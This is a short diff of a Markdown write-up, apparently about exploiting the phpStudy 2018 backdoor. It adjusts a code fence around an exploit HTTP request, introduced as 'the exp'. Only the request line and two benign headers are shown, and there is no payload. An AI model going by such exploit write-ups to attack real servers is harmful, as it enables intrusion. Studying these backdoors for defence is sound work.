@@ -49,7 +49,8 @@ phpStudy2018路径
 ![](2.png)
 
 大佬给出exp如下
-```
+
+``` 
 GET /index.php HTTP/1.1
 Host: yourip.com
 Cache-Control: max-age=0
